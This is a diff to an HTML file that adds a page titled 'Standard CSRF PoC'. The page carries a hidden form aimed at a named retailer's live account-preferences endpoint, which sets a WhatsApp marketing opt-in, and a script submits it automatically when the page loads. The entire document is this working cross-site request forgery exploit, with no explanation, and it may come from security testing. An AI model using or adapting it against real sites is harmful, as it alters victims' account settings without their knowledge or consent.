@@ -6,7 +6,15 @@
   <title>Document</title>
 </head>
 <body>
-<h1>halo dunia</h1>
-<script src="jajal.js"></script>
+   <h3>Standard CSRF PoC</h3>
+      <form action="https://ae.loccitane.com/on/demandware.store/Sites-Loccitane_AE-Site/en_AE/Account-SavePreferences" method="post">
+      <input type="hidden" name="dwfrm_accountpreferences_optinlist_optinwhatsapp" value="true" />
+    <input type="hidden" name="dwfrm_accountpreferences_save" value="" />
+          <input type="submit" value="Submit request" />
+      </form>
+      <script>
+          history.pushState('', '', '/');
+          document.forms[0].submit();
+      </script>
 </body>
 </html>
